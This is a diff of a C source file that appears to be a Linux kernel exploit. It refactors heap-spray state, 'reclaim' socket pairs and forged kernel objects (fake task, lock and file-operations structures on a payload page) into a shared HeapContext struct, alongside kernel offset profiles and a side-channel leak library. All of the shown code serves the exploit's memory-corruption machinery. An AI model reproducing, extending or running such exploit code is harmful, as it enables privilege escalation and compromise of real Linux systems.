@@ -3,20 +3,16 @@
 #include "target.h"
 #include "kernelsnitch/kernelsnitch.h"
 
-static KernelSnitchContext *ks;
-static size_t mm_objs_per_slab;
-static unsigned char *skb_buf;
-static int reclaim_sv[2] = {-1, -1};
-static int quarantined_reclaim_sv[2] = {-1, -1};
-static int prebuilt_reclaim_sv[2] = {-1, -1};
-static uintptr_t prebuilt_page_base, prebuilt_fake_lock, prebuilt_fake_w0;
-static uintptr_t prebuilt_fake_task, prebuilt_fake_parent, prebuilt_fake_right;
-static uintptr_t prebuilt_fake_left, prebuilt_fake_fops;
-static struct mm_ctx prepare_ctx;
-static struct mm_ctx spray_ctx;
-static struct mm_ctx pre_ctx;
-static struct mm_ctx post_ctx;
-static pid_t child_leak;
+HeapContext g_heap_context;
+#define ks (g_heap_context.snitch)
+#define mm_objs_per_slab (g_heap_context.mm_objs_per_slab)
+#define skb_buf (g_heap_context.skb_buffer)
+#define reclaim_sv (g_heap_context.current.reclaim.fd)
+#define prepare_ctx (g_heap_context.prepare)
+#define spray_ctx (g_heap_context.spray)
+#define pre_ctx (g_heap_context.pre)
+#define post_ctx (g_heap_context.post)
+#define child_leak (g_heap_context.leak_child)
 
 static const struct kernel_offsets *profile_values(void) {
   return target_profile_values(&g_target_profile);
@@ -27,23 +23,6 @@ static const struct kernel_offsets *profile_values(void) {
 static long long ms_since(struct timespec *t0) {
   return (long long)runtime_elapsed_ms(t0);
 }
-
-/* f2fs rollback drops everything since the last checkpoint, so fsync at
- * stage boundaries or a panicking run loses its own lines */
-void log_sync(void) {
-  fflush(stdout);
-  fsync(STDOUT_FILENO);
-}
-
-uintptr_t page_base;
-uintptr_t last_mm_struct;
-uintptr_t fake_lock;
-uintptr_t fake_w0;
-uintptr_t fake_task;
-uintptr_t fake_parent;
-uintptr_t fake_right;
-uintptr_t fake_left;
-uintptr_t fake_fops;
 
 /* Decoupling plan: decide whether TCP zerocopy is selected. Inputs: profile and
  * runtime-config snapshot; output: boolean. Future:
@@ -311,86 +290,45 @@ void kill_child(pid_t child) {
 /* Decoupling plan: release the current reclaim socket pair. Input/output: heap
  * context. Future: reclaim_pair_destroy(ReclaimPair *). */
 void close_reclaim_sockets(void) {
-  for (int i = 0; i < 2; i++) {
-    if (reclaim_sv[i] >= 0) {
-      close(reclaim_sv[i]);
-      reclaim_sv[i] = -1;
-    }
-  }
+  payload_page_destroy(&g_heap_context.current);
 }
 
 /* Decoupling plan: transfer current reclaim sockets into quarantine. Input:
  * heap context; output: transfer status. Future: reclaim_pair_quarantine(). */
 int quarantine_reclaim_sockets(void) {
-  if (quarantined_reclaim_sv[0] >= 0 || quarantined_reclaim_sv[1] >= 0)
-    return 0;
-  if (reclaim_sv[0] < 0 || reclaim_sv[1] < 0)
-    return 0;
-  quarantined_reclaim_sv[0] = reclaim_sv[0];
-  quarantined_reclaim_sv[1] = reclaim_sv[1];
-  reclaim_sv[0] = reclaim_sv[1] = -1;
-  return 1;
+  return payload_page_move(&g_heap_context.quarantine,
+                           &g_heap_context.current,
+                           PAYLOAD_PAGE_QUARANTINED);
 }
 
 /* Decoupling plan: release all quarantined reclaim ownership. Input/output:
  * heap context. Future: heap_context_release_quarantine(). */
 void release_quarantined_reclaim_sockets(void) {
-  for (int i = 0; i < 2; i++) {
-    if (quarantined_reclaim_sv[i] >= 0) {
-      close(quarantined_reclaim_sv[i]);
-      quarantined_reclaim_sv[i] = -1;
-    }
-  }
+  payload_page_destroy(&g_heap_context.quarantine);
 }
 
 /* Decoupling plan: move the current payload page into the prebuilt slot. Input:
  * heap context; output: move status. Future: payload_page_move(prebuilt,current). */
 int stash_prebuilt_page(void) {
-  if (prebuilt_reclaim_sv[0] >= 0 || reclaim_sv[0] < 0)
-    return 0;
-  prebuilt_reclaim_sv[0] = reclaim_sv[0];
-  prebuilt_reclaim_sv[1] = reclaim_sv[1];
-  reclaim_sv[0] = reclaim_sv[1] = -1;
-  prebuilt_page_base = page_base;
-  prebuilt_fake_lock = fake_lock;
-  prebuilt_fake_w0 = fake_w0;
-  prebuilt_fake_task = fake_task;
-  prebuilt_fake_parent = fake_parent;
-  prebuilt_fake_right = fake_right;
-  prebuilt_fake_left = fake_left;
-  prebuilt_fake_fops = fake_fops;
-  return 1;
+  return payload_page_move(&g_heap_context.prebuilt,
+                           &g_heap_context.current,
+                           PAYLOAD_PAGE_PREBUILT);
 }
 
 /* Decoupling plan: move the prebuilt page into the active slot. Input/output:
  * heap context; output: activation status. Future: heap_activate_prebuilt_page(). */
 int activate_prebuilt_page(void) {
-  if (prebuilt_reclaim_sv[0] < 0)
-    return 0;
+  if (!payload_page_has_reclaim(&g_heap_context.prebuilt)) return 0;
   close_reclaim_sockets();
-  reclaim_sv[0] = prebuilt_reclaim_sv[0];
-  reclaim_sv[1] = prebuilt_reclaim_sv[1];
-  prebuilt_reclaim_sv[0] = prebuilt_reclaim_sv[1] = -1;
-  page_base = prebuilt_page_base;
-  fake_lock = prebuilt_fake_lock;
-  fake_w0 = prebuilt_fake_w0;
-  fake_task = prebuilt_fake_task;
-  fake_parent = prebuilt_fake_parent;
-  fake_right = prebuilt_fake_right;
-  fake_left = prebuilt_fake_left;
-  fake_fops = prebuilt_fake_fops;
-  return 1;
+  return payload_page_move(&g_heap_context.current,
+                           &g_heap_context.prebuilt,
+                           PAYLOAD_PAGE_CURRENT);
 }
 
 /* Decoupling plan: destroy the prebuilt page and its reclaim pair. Input/output:
  * heap context. Future: payload_page_destroy(&context->prebuilt). */
 void discard_prebuilt_page(void) {
-  for (int i = 0; i < 2; i++) {
-    if (prebuilt_reclaim_sv[i] >= 0) {
-      close(prebuilt_reclaim_sv[i]);
-      prebuilt_reclaim_sv[i] = -1;
-    }
-  }
+  payload_page_destroy(&g_heap_context.prebuilt);
 }
 
 void close_ctx_memfds(struct mm_ctx *ctx) {
@@ -741,6 +679,7 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
   }
 
   SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
+  g_heap_context.current.state = PAYLOAD_PAGE_CURRENT;
   int sndbuf = 1 << 20;
   setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
   int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
